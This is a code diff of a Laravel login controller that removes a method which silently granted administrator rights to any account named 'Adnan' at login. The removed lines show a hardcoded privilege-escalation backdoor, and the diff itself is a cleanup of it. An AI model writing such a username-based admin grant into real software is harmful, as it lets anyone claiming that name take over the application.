@@ -39,29 +39,19 @@ class AuthController
         $field=filter_var($cred['login'],FILTER_VALIDATE_EMAIL)?'email':'username';
         if(Auth::attempt([$field=>$cred['login'],'password'=>$cred['password']],false)){
             RateLimiter::clear($key);
-            $user=$this->ensurePrimaryAdmin(auth()->user());
-            if($user->is_banned){ Auth::logout(); return back()->withErrors(['login'=>'الحساب محظور من الإدارة']); }
+            if(auth()->user()->is_banned){ Auth::logout(); return back()->withErrors(['login'=>'الحساب محظور من الإدارة']); }
             try {
                 $cancellation->reactivate(auth()->user());
             } catch (GoneHttpException $e) {
                 Auth::logout();
                 return back()->withErrors(['login' => $e->getMessage()]);
             }
-            $user->update(['last_seen_at'=>now()]);
+            auth()->user()->update(['last_seen_at'=>now()]);
             $r->session()->regenerate();
             return redirect()->route('games');
         }
         RateLimiter::hit($key,60);
         return back()->withErrors(['login'=>'بيانات الدخول غير صحيحة']);
-    }
-
-    private function ensurePrimaryAdmin(User $user): User
-    {
-        if (strcasecmp(trim((string) $user->username), 'Adnan') === 0 && !$user->is_admin) {
-            $user->forceFill(['is_admin' => true])->save();
-        }
-
-        return $user->refresh();
     }
 
     public function logout(Request $request)
